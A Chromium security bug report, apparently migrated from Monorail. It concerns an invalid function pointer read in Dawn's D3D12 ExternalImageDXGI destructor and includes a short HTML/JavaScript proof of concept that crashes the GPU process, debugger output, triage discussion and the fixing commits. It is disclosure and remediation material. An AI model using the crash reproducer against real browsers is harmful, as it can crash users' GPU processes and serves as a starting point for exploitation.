# Security: Invalid function pointer in ~ExternalImageDXGI() in D3D backend

| Field | Value |
|-------|-------|
| **Issue ID** | [40060042](https://issues.chromium.org/issues/40060042) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Dawn |
| **Platforms** | Windows |
| **Reporter** | lo...@gmail.com |
| **Assignee** | su...@chromium.org |
| **Created** | 2022-06-22 |
| **Bounty** | $7,000.00 |

## Description

**VULNERABILITY DETAILS**  

Specifically crafted HTML file can trigger Invalid function pointer read in ~ExternalImageDXGI() in D3D backend. This bug has the potential to be exploited to execute arbitrary code in a privileged process, i.e. the GPU process.

```
Open the PoC (InvalidFunPointer_~ExternalImageDXGI_PoC.html) in chrome with "--enable-features=WebGPUService --enable-blink-features=WebGPU,WebGPUImportTexture".   
The PoC can trigger a race condition in D3D backend, which in turn causes a crash in D3D12Core.  

The crash happens at the following instruction which tries to read from meomry address rax+10h and assign it back to rax.   

	00007ffe`9233f258 488b4010        mov     rax,qword ptr [rax+10h] ds:00007ffe`d4f75068=????????????????  
	  
The next instruction is a virtual function call:  

	2:038> u  
	D3D12Core!CLayeredObject<CBackingCommandAllocator>::CContainedObject::Release+0x18:  
	00007ffe`9233f258 488b4010        mov     rax,qword ptr [rax+10h]  
	00007ffe`9233f25c ff15e65e0f00    call    qword ptr [D3D12Core!_guard_xfg_dispatch_icall_fptr (00007ffe`92435148)]  

The RAX registers would store the address to jump to. So the invalid memory access happens when it tries to read a function pointer from an invalid memory location.  
From this point of view, this bug has the potential of being exploited to execute arbitrary code in the GPU process.  
  
Looking at related code path, this bug did not exist before WebGPU Canvas STORAGE_BINDING was enabled by https://chromium-review.googlesource.com/c/chromium/src/+/3534517 on 22 Mar 2022.  

```

**VERSION**  

Google Chrome 104.0.5112.14 (Official Build) dev (64-bit) (cohort: Dev)  

Revision c1193d7546a4ec3b15e780485a144efdb671911c-refs/branch-heads/5112@{#127}  

OS Windows 11 Version 21H2 (Build 22000.739)  

JavaScript V8 10.4.132.8

**REPRODUCTION CASE** (InvalidFunPointer\_~ExternalImageDXGI\_PoC.html)  

<body><canvas id="canvas0"></body><script>  

canvas0.getContext("2d");  

navigator.gpu.requestAdapter().then((adap)=>{adap.requestDevice().then((dev)=>{dev.experimentalImportTexture(canvas0, 8); });});  

setTimeout(function(){location.reload();},200);  

</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: gpu process  

Crash State:

```
(2900.658): Access violation - code c0000005 (!!! second chance !!!)  
D3D12Core!CLayeredObject<CBackingCommandAllocator>::CContainedObject::Release+0x18:  
00007ffe`9233f258 488b4010        mov     rax,qword ptr [rax+10h] ds:00007ffe`d4f75068=????????????????  
2:038> r  
rax=00007ffed4f75058 rbx=0000675400d89e60 rcx=00000127663ca8e0  
rdx=00007ffee37b3aa0 rsi=0000675400ddc300 rdi=0000675400c5b840  
rip=00007ffe9233f258 rsp=0000001649dfd440 rbp=0000675400d8c6c0  
 r8=0000000000000000  r9=00007ffee37b3aa0 r10=baac1f10365eb170  
r11=008a222222220202 r12=0000675400d89e60 r13=0000675400ddc320  
r14=0000000000000000 r15=0000675400261c30  
iopl=0         nv up ei pl nz na pe nc  
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010200  
D3D12Core!CLayeredObject<CBackingCommandAllocator>::CContainedObject::Release+0x18:  
00007ffe`9233f258 488b4010        mov     rax,qword ptr [rax+10h] ds:00007ffe`d4f75068=????????????????  
2:038> k  
 # Child-SP          RetAddr           Call Site  
00 00000016`49dfd440 00007ffe`5faa217b D3D12Core!CLayeredObject<CBackingCommandAllocator>::CContainedObject::Release+0x18  
01 (Inline Function) --------`-------- chrome!std::Cr::default_delete<dawn::native::d3d12::ExternalImageDXGI>::operator()+0x8 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 51]   
02 (Inline Function) --------`-------- chrome!std::Cr::unique_ptr<dawn::native::d3d12::ExternalImageDXGI,std::Cr::default_delete<dawn::native::d3d12::ExternalImageDXGI> >::reset+0x100 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 308]   
03 (Inline Function) --------`-------- chrome!std::Cr::unique_ptr<dawn::native::d3d12::ExternalImageDXGI,std::Cr::default_delete<dawn::native::d3d12::ExternalImageDXGI> >::operator=+0x100 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 266]   
04 00000016`49dfd470 00007ffe`5faa1fc0 chrome!gpu::SharedImageBackingD3D::~SharedImageBackingD3D+0x19b [C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\shared_image_backing_d3d.cc @ 397]   
05 00000016`49dfd4b0 00007ffe`5f525b47 chrome!gpu::SharedImageBackingD3D::~SharedImageBackingD3D+0x10 [C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\shared_image_backing_d3d.cc @ 395]   
06 (Inline Function) --------`-------- chrome!std::Cr::default_delete<gpu::SharedImageBacking>::operator()+0x11 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 51]   
07 (Inline Function) --------`-------- chrome!std::Cr::unique_ptr<gpu::SharedImageBacking,std::Cr::default_delete<gpu::SharedImageBacking> >::reset+0x2c [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 308]   
08 (Inline Function) --------`-------- chrome!std::Cr::unique_ptr<gpu::SharedImageBacking,std::Cr::default_delete<gpu::SharedImageBacking> >::operator=+0x2c [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 228]   
09 (Inline Function) --------`-------- chrome!std::Cr::__move_constexpr+0x38 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__algorithm\move.h @ 32]   
0a (Inline Function) --------`-------- chrome!std::Cr::__move+0x38 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__algorithm\move.h @ 41]   
0b (Inline Function) --------`-------- chrome!std::Cr::move+0x38 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__algorithm\move.h @ 68]   
0c (Inline Function) --------`-------- chrome!std::Cr::vector<std::Cr::unique_ptr<gpu::SharedImageBacking,std::Cr::default_delete<gpu::SharedImageBacking> >,std::Cr::allocator<std::Cr::unique_ptr<gpu::SharedImageBacking,std::Cr::default_delete<gpu::SharedImageBacking> > > >::erase+0x38 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\vector @ 1627]   
0d (Inline Function) --------`-------- chrome!base::internal::flat_tree<std::Cr::unique_ptr<gpu::SharedImageBacking,std::Cr::default_delete<gpu::SharedImageBacking> >,base::identity,std::Cr::less<void>,std::Cr::vector<std::Cr::unique_ptr<gpu::SharedImageBacking,std::Cr::default_delete<gpu::SharedImageBacking> >,std::Cr::allocator<std::Cr::unique_ptr<gpu::SharedImageBacking,std::Cr::default_delete<gpu::SharedImageBacking> > > > >::erase+0x45 [C:\b\s\w\ir\cache\builder\src\base\containers\flat_tree.h @ 893]   
0e 00000016`49dfd4f0 00007ffe`5f525885 chrome!gpu::SharedImageManager::OnRepresentationDestroyed+0x247 [C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\shared_image_manager.cc @ 399]   
0f (Inline Function) --------`-------- chrome!gpu::SharedImageRepresentation::~SharedImageRepresentation+0x2d [C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\shared_image_representation.cc @ 41]   
10 00000016`49dfd690 00007ffe`5f26a6db chrome!gpu::SharedImageRepresentationFactoryRef::~SharedImageRepresentationFactoryRef+0x75 [C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\shared_image_representation.cc @ 380]   
11 (Inline Function) --------`-------- chrome!gpu::SharedImageRepresentationFactoryRef::~SharedImageRepresentationFactoryRef+0x8 [C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\shared_image_representation.h @ 148]   
12 (Inline Function) --------`-------- chrome!std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef>::operator()+0x8 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 51]   
13 (Inline Function) --------`-------- chrome!std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> >::reset+0x1d [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 308]   
14 (Inline Function) --------`-------- chrome!std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> >::~unique_ptr+0x1d [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 262]   
15 (Inline Function) --------`-------- chrome!std::Cr::allocator<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> > >::destroy+0x1d [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\allocator.h @ 156]   
16 (Inline Function) --------`-------- chrome!std::Cr::allocator_traits<std::Cr::allocator<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> > > >::destroy+0x1d [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\allocator_traits.h @ 309]   
17 (Inline Function) --------`-------- chrome!std::Cr::vector<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> >,std::Cr::allocator<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> > > >::__base_destruct_at_end+0x1d [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\vector @ 822]   
18 (Inline Function) --------`-------- chrome!std::Cr::vector<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> >,std::Cr::allocator<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> > > >::__destruct_at_end+0x75 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\vector @ 706]   
19 (Inline Function) --------`-------- chrome!std::Cr::vector<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> >,std::Cr::allocator<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> > > >::erase+0xba [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\vector @ 1627]   
1a (Inline Function) --------`-------- chrome!base::internal::flat_tree<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> >,base::identity,std::Cr::less<void>,std::Cr::vector<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> >,std::Cr::allocator<std::Cr::unique_ptr<gpu::SharedImageRepresentationFactoryRef,std::Cr::default_delete<gpu::SharedImageRepresentationFactoryRef> > > > >::erase+0xba [C:\b\s\w\ir\cache\builder\src\base\containers\flat_tree.h @ 893]   
1b 00000016`49dfd6d0 00007ffe`5f26a3ce chrome!gpu::SharedImageFactory::DestroySharedImage+0x1ab [C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\shared_image_factory.cc @ 542]   
1c 00000016`49dfd870 00007ffe`5f26883b chrome!gpu::SharedImageStub::OnDestroySharedImage+0x6e [C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\shared_image_stub.cc @ 316]   
1d 00000016`49dfda40 00007ffe`63503777 chrome!gpu::SharedImageStub::ExecuteDeferredRequest+0x1bb [C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\shared_image_stub.cc @ 106]   
1e 00000016`49dfddb0 00007ffe`5fcf764f chrome!gpu::GpuChannel::ExecuteDeferredRequest+0x167 [C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc @ 723]   
1f (Inline Function) --------`-------- chrome!base::internal::FunctorTraits<void (content::BackgroundSyncManager::\*)(base::OnceCallback<void ()>),void>::Invoke+0x35 [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 541]   
20 (Inline Function) --------`-------- chrome!base::internal::InvokeHelper<1,void>::MakeItSo+0x4c [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 725]   
21 (Inline Function) --------`-------- chrome!base::internal::Invoker<base::internal::BindState<void (content::BackgroundSyncManager::\*)(base::OnceCallback<void ()>),base::WeakPtr<content::BackgroundSyncManager>,base::OnceCallback<void ()> >,void ()>::RunImpl+0x4c [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 778]   
22 00000016`49dfde30 00007ffe`5f2988fd chrome!base::internal::Invoker<base::internal::BindState<void (content::BackgroundSyncManager::\*)(base::OnceCallback<void ()>),base::WeakPtr<content::BackgroundSyncManager>,base::OnceCallback<void ()> >,void ()>::RunOnce+0x5f [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 751]   
23 (Inline Function) --------`-------- chrome!base::OnceCallback<void ()>::Run+0xd [C:\b\s\w\ir\cache\builder\src\base\callback.h @ 143]   
24 00000016`49dfde70 00007ffe`63153120 chrome!gpu::Scheduler::RunNextTask+0x8cd [C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler.cc @ 698]   
25 (Inline Function) --------`-------- chrome!base::OnceCallback<void ()>::Run+0x17 [C:\b\s\w\ir\cache\builder\src\base\callback.h @ 143]   
26 (Inline Function) --------`-------- chrome!base::TaskAnnotator::RunTaskImpl+0x193 [C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc @ 135]   
27 (Inline Function) --------`-------- chrome!base::TaskAnnotator::RunTask+0x96c [C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.h @ 74]   
28 (Inline Function) --------`-------- chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0xe8d [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 415]   
29 00000016`49dfdfc0 00007ffe`608edc56 chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0xf60 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 293]   
2a 00000016`49dfe8b0 00007ffe`5f5f70a4 chrome!base::MessagePumpDefault::Run+0x86 [C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc @ 41]   
2b 00000016`49dfe960 00007ffe`5f88f53f chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0x84 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 537]   
2c 00000016`49dfe9d0 00007ffe`605b7ec1 chrome!base::RunLoop::Run+0x1df [C:\b\s\w\ir\cache\builder\src\base\run_loop.cc @ 143]   
2d 00000016`49dfeae0 00007ffe`6165d4b6 chrome!content::GpuMain+0x651 [C:\b\s\w\ir\cache\builder\src\content\gpu\gpu_main.cc @ 398]   
2e 00000016`49dfede0 00007ffe`5f5b3773 chrome!content::RunOtherNamedProcessTypeMain+0x3f6 [C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc @ 720]   
2f 00000016`49dfef00 00007ffe`5f5b3025 chrome!content::ContentMainRunnerImpl::Run+0x2c3 [C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc @ 1061]   
30 (Inline Function) --------`-------- chrome!content::RunContentProcess+0x619 [C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc @ 407]   
31 00000016`49dfefe0 00007ffe`5f5b0b5b chrome!content::ContentMain+0x6a5 [C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc @ 435]   
32 00000016`49dff210 00007ff7`9c944142 chrome!ChromeMain+0x21b [C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc @ 177]   
33 00000016`49dff360 00007ff7`9c943ba1 chrome_exe!MainDllLoader::Launch+0x312 [C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc @ 167]   
34 00000016`49dff5e0 00007ff7`9c9ea3f2 chrome_exe!wWinMain+0xe91 [C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc @ 385]   
35 (Inline Function) --------`-------- chrome_exe!invoke_main+0x21 [d:\a01\_work\12\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 118]   
36 00000016`49dffa10 00007ffe`e26b54e0 chrome_exe!__scrt_common_main_seh+0x106 [d:\a01\_work\12\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288]   
37 00000016`49dffa50 00007ffe`e372485b KERNEL32!BaseThreadInitThunk+0x10  
38 00000016`49dffa80 00000000`00000000 ntdll!RtlUserThreadStart+0x2b  

```

**CREDIT INFORMATION**  

Reporter credit: Looben Yang

## Attachments

- [InvalidFunPointer_~ExternalImageDXGI_PoC.html](attachments/InvalidFunPointer_~ExternalImageDXGI_PoC.html) (text/plain, 256 B)

## Timeline

### [Deleted User] (2022-06-22)

[Empty comment from Monorail migration]

### aj...@google.com (2022-06-22)

Cannot repro on Windows HEAD asan or release. It might be helpful to see the full command line you are using. 

### cl...@chromium.org (2022-06-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5137669663424512.

### cl...@chromium.org (2022-06-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5736860483780608.

### aj...@google.com (2022-06-22)

also - if you can repro this on a published build could you provide an uploaded crash id from chrome://crashes?

### cl...@chromium.org (2022-06-22)

Testcase 5137669663424512 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5137669663424512.

### lo...@gmail.com (2022-06-22)

The full command line arguments are "--enable-features=WebGPUService --enable-blink-features=WebGPU,WebGPUImportTexture" as I stated  in the VULNERABILITY DETAILS above.

The following is the output from chrome://version

Command Line	"C:\Program Files\Google\Chrome Dev\Application\chrome.exe" --enable-features=WebGPUService --enable-blink-features=WebGPU,WebGPUImportTexture --enable-features=WebGPUService --disable-features=EventPath --flag-switches-begin --flag-switches-end

ASAN does not provide more information than windbg in this case. Because it's not a direct memory corruption in chromium objects, rather it's more of incorrect D3D API excise causing access violation in D3D code. Besides, the GPU process is in the background, so when you run ASAN from command line, you probably could not see any ASAN report except a log like "gpu process was reset" or something like that but the chrome keeps running no stop. If you run ASAN under a debugger, you can catch the access violation if access violation is not disabled in exception handling settings in windbg (Usually I have to disable access violation in windbg cause ASAN itself will generate lots of access violations initially).


 



### lo...@gmail.com (2022-06-22)

I tried to generate a crash report.
Is this what you need as id?

Local Crash Context:	b2ad838d-5185-4fbe-83ef-eb5ec5a32a83


### lo...@gmail.com (2022-06-22)

Must be this one:

Uploaded Crash Report ID:	7b2d25af4d99689e

### aj...@google.com (2022-06-22)

-> sunnyps as a recent contributor to gpu/command_buffer/service/shared_image_backing_d3d.cc

I have not been able to repro this in Windows asan but the crash provided by the reporter in goto/crash/7b2d25af4d99689e is convincing.

Please let me know if the flags are currently enabled for any users - if they are off (and there is not origin trial) then we can mark this as security_impact=none.

Sev=High as potential code execution in the gpu process from web-content.
FoundIn 102 as commits are a bit old. Please update if the problem proves to have been introduced later than 102.


[Monorail components: Internals>GPU>Dawn]

### [Deleted User] (2022-06-22)

[Empty comment from Monorail migration]

### se...@chromium.org (2022-06-23)

+enga

I'm not familiar with those flags ('--enable-features=WebGPUService --enable-blink-features=WebGPU,WebGPUImportTexture'). The main flag for WebGPU is --enable-unsafe-webgpu. Does the repro occur with that flag alone?  Corentin, Austin: are the two above flags enabled (directly or indirectly) by the origin trial?

### [Deleted User] (2022-06-23)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-06-23)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cw...@chromium.org (2022-06-24)

As far as I know experimentalImportTexture is not exposed by the WebGPU Origin Trial. At this point we should just remove this code path. However the bug is probably real and possible to trigger via other means such as importExternalTexture or copyExternalImageToTexture. Even if no JS code can trigger it, a compromised renderer process could so we need to fix it. At first glance it's not clear what the exact issue is though.

### [Deleted User] (2022-07-06)

sunnyps: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cw...@chromium.org (2022-07-08)

Sunny, are you able to take a look at this one or should be find a different owner?

### su...@google.com (2022-07-08)

I'm looking into this - coincidentally I think this is related to the test failures I'm seeing for landing shared image D3D fence code here: https://chromium-review.googlesource.com/c/chromium/src/+/3700811

### su...@google.com (2022-07-08)

The mode of failure in both cases is similar - the shared image holding the ExternalImageDXGI lives longer than the WGPUDevice that created it.

I have a suspicion that holding onto the backend device refptr in ExternalImageDXGI will fix this and the test failures I'm seeing. I have a setup that runs the SharedImageBackingFactoryD3DTest.UnclearDawn_SkiaFails test on Win 10 Nvidia bots that reproduces the crash consistently - unfortunately it doesn't produce a crash dump, but I saw a similar stack as this bug in another test failure with my CL. Let me try the speculative fix - hopefully it works!

### su...@google.com (2022-07-08)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-07-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/e2955e51b69833a9b7c05bf35297b9259b94802b

commit e2955e51b69833a9b7c05bf35297b9259b94802b
Author: Sunny Sachanandani <sunnyps@chromium.org>
Date: Tue Jul 12 00:01:12 2022

gpu: Cache ExternalImageDXGI per WGPUDevice for correctness

After crrev.com/c/dawn/95860, WGPUDevice destruction will invalidate
ExternalImageDXGI's internal resources so for correctness it will be
required to not reuse ExternalImageDXGI across WGPUDevices. This
happened to work due to using the same D3D12 device (from ANGLE's
default adapter) across all WGPUDevices before.

Bug: dawn:576, chromium:1338470
Change-Id: Ie576c798eff5e967a88585338fb299d63e55f0d1
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3752055
Auto-Submit: Sunny Sachanandani <sunnyps@chromium.org>
Reviewed-by: Austin Eng <enga@chromium.org>
Commit-Queue: Sunny Sachanandani <sunnyps@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1022972}

[modify] https://crrev.com/e2955e51b69833a9b7c05bf35297b9259b94802b/gpu/command_buffer/service/shared_image_backing_d3d.h
[modify] https://crrev.com/e2955e51b69833a9b7c05bf35297b9259b94802b/gpu/command_buffer/service/shared_image_backing_d3d.cc


### gi...@appspot.gserviceaccount.com (2022-07-13)

The following revision refers to this bug:
  https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2

commit 7ae5c41412be17ea489cf20344141ec18410f5f2
Author: Sunny Sachanandani <sunnyps@chromium.org>
Date: Wed Jul 13 11:33:51 2022

d3d12: Destroy ExternalImageDXGI resources on device destruction

D3D12 objects can have implicit dependencies on device resources that
are not captured by holding ComPtrs:

"Direct3D 12 uses COM-style reference counting only for the lifetimes of
interfaces (by using the weak reference model of Direct3D tied to the
lifetime of the device). All resource and description memory lifetimes
are the sole responsibly of the app to maintain for the proper duration,
and are not reference counted. Direct3D 11 uses reference counting to
manage the lifetimes of interface dependencies as well."

Source: https://docs.microsoft.com/en-us/windows/win32/direct3d12/important-changes-from-directx-11-to-directx-12

ExternalImageDXGI can outlive the device it was created on e.g. the D3D
shared image backing holds on to the ExternalImageDXGI for its lifetime.
ExternalImageDXGI destructor can invoke code that depends on D3D12
resources that might have already been destroyed. In particular, this
shows up as ComPtr::Release for ID3D12Fence crashing mysteriously, and
is also speculated as the cause for a racy invalid function pointer
dereference in crbug.com/1338470.

This CL makes the D3D12 backend device destroy the ExternalImageDXGI's
resources on device destruction making it effectively a weak pointer.
This unblocks landing https://crrev.com/c/3700811 and hopefully fixes
crbug.com/1338470 as well.

This CL also deprecates unnecessary WGPUDevice param to ProduceTexture,
and adds an IsValid() method so that the shared image can check it and
decide to recreate the ExternalImageDXGI if needed.

Bug: dawn:576, chromium:1338470
Change-Id: I2122cf807587cf3b1218ba29ea291263df0cf698
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/95860
Kokoro: Kokoro <noreply+kokoro@google.com>
Auto-Submit: Sunny Sachanandani <sunnyps@chromium.org>
Reviewed-by: Corentin Wallez <cwallez@chromium.org>
Commit-Queue: Corentin Wallez <cwallez@chromium.org>

[add] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/src/dawn/native/d3d12/ExternalImageDXGIImpl.cpp
[modify] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/src/dawn/native/d3d12/D3D12Backend.cpp
[modify] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/src/dawn/native/d3d12/D3D11on12Util.h
[modify] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/src/dawn/tests/end2end/D3D12ResourceWrappingTests.cpp
[modify] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/src/dawn/native/d3d12/DeviceD3D12.cpp
[modify] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/include/dawn/native/D3D12Backend.h
[modify] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/src/dawn/native/CMakeLists.txt
[modify] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/src/dawn/native/d3d12/D3D11on12Util.cpp
[add] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/src/dawn/native/d3d12/ExternalImageDXGIImpl.h
[modify] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/src/dawn/native/BUILD.gn
[modify] https://dawn.googlesource.com/dawn/+/7ae5c41412be17ea489cf20344141ec18410f5f2/src/dawn/native/d3d12/DeviceD3D12.h


### gi...@appspot.gserviceaccount.com (2022-07-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/a1f418c8cd3116fa627b3027f4b6ee72deb2b9f9

commit a1f418c8cd3116fa627b3027f4b6ee72deb2b9f9
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Wed Jul 13 16:26:10 2022

Roll Dawn from 9a32a720acea to 2a8c00f53a2e (4 revisions)

https://dawn.googlesource.com/dawn.git/+log/9a32a720acea..2a8c00f53a2e

2022-07-13 bclayton@google.com tint: Limit const expr vector reserve size
2022-07-13 stephen@hexops.com dawn/native/d3d12: use correct __uuidof operator
2022-07-13 sunnyps@chromium.org d3d12: Destroy ExternalImageDXGI resources on device destruction
2022-07-13 dawn-autoroll@skia-public.iam.gserviceaccount.com Roll vulkan-deps from 136497f1126c to 50b3fdf7ad7d (2 revisions)

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/dawn-chromium-autoroll
Please CC bclayton@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in Dawn: https://bugs.chromium.org/p/dawn/issues/entry
To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Cq-Include-Trybots: luci.chromium.try:dawn-linux-x64-deps-rel;luci.chromium.try:dawn-mac-x64-deps-rel;luci.chromium.try:dawn-win10-x64-deps-rel;luci.chromium.try:dawn-win10-x86-deps-rel
Bug: chromium:1338470,chromium:1343963
Tbr: bclayton@google.com
Change-Id: I3ce9673e296c2a1b4b6508aabf335fb5e5a0e931
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3760634
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/main@{#1023779}

[modify] https://crrev.com/a1f418c8cd3116fa627b3027f4b6ee72deb2b9f9/DEPS


### gi...@appspot.gserviceaccount.com (2022-07-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/eefbfb4e69765eebf21fb6941ce898bcb183f7b6

commit eefbfb4e69765eebf21fb6941ce898bcb183f7b6
Author: Sunny Sachanandani <sunnyps@chromium.org>
Date: Wed Jul 13 18:24:57 2022

gpu: Evict invalid Dawn DXGI external images

After https://crrev.com/c/3752055, Dawn DXGI external images are keyed
on the WGPUDevice that created them. This CL keeps the external image
map from growing unbounded by evicting invalid images based on IsValid()
